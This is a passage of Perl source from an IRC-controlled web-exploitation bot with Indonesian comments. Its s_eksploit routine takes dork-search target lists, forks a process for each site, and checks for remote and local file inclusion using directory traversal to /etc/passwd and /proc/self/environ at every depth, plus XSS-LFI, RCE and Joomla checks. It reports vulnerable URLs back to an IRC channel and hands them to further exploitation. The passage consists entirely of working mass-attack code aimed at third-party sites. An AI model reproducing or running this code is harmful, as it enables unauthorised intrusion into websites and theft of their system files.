  if ($type == 4){ irc_msg($to,$colz{7}."Auto DorkZ XSSLFI ScaN & ExpLoiT SeLeSai!".$colz{14}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  }
  return;
  }
}

sub s_eksploit {
  #Type: 1 = Biasa, 2 = Cari dan exploit, 3 = Joomla
  #Engine: Kosong = Eksploit total, Ada = Eksploit per engine
  my ($type,$chan,$bug,$dork,$tf,$engine) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  my @bugjoomla = bugjoomla($chan) if ($type == 3);
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE",$colz{5}."Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @kotor = lnk_sortir(@semuatarget);
  my @target = lnk_filter(@kotor);
  if (!$engine) {
    irc_msg($chan,$colz{5}."HaSiL PeNCaRiaN".$colz{3}." $dork");
    irc_msg($chan,$colz{10}."ToTaL: ".$colz{6}." ".scalar(@semuatarget)." ".$colz{14}."KoToR: "." ".$colz{6}.scalar(@kotor)." ".$colz{14}."BeRsih: ".$colz{6}." ".scalar(@target).$colz{2}." ID: $tf ".$colz{7}."ExpLoiTaSi DiMuLai!");
  }
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($type == 1 && $hitung % $conf{rficnt} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." ".$hitung." $colz{6} ".scalar(@target));
    }
    if ($type != 1 && $hitung % $conf{rficnt2} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." $engine ".$colz{6}." ".$hitung." ".$colz{1}." => ".$colz{14}." ".scalar(@target). " ");
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
      if ($type != 3) {
        my $q = bukasitus("http://".$situs.$bug.$Ckrid."?");
        if ($q =~ /Origins/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz});                 }
    elsif($q =~ /failed to open stream/){
    my $qlfi = bukasitus("http://".$situs.$bug.$lfitest);
    my $qlfienviron;
        if ($qlfi =~ /HTTP_USER_AGENT/){ safemode(1,$chan,$situs,$bug.$lfitest."&Origins=",$engine); sleep($conf{sleepz});    }
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../etc/passwd%00".$colz{1}." ]");}}}

        else {
            $q = bukasitus("http://".$situs.$bug.$xsslfitst);
            if ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)                { irc_msg($chan,"[".$colz{6}."XSSLFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");        }
        }
    }
    else {
        $q = bukasitus("http://".$situs.$bug.$rcetest);
        if ($q =~ /Origins/) { irc_msg($chan,"[".$colz{3}."RCE".$colz{1}."][".$colz{3}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." "); }
    }
      }
      else {
        foreach my $bug (@bugjoomla) {
        my $q = bukasitus("http://".$situs.$bug.$Ckrid."?");
        if ($q =~ /Origins/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz});             }
    elsif($q =~ /failed to open stream/){
        my $qlfi = bukasitus("http://".$situs.$bug.$lfitest);
        my $qlfienviron;
        if ($qlfi =~ /HTTP_USER_AGENT/){ safemode(1,$chan,$situs,$bug.$lfitest."&Origins=",$engine); sleep($conf{sleepz});    }
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
        elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../proc/self/environ%00&Origins=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{6}."LFI".$colz{1}."][".$colz{3}." http://".$situs.$bug."../../../../../../etc/passwd%00".$colz{1}." ]");}}}
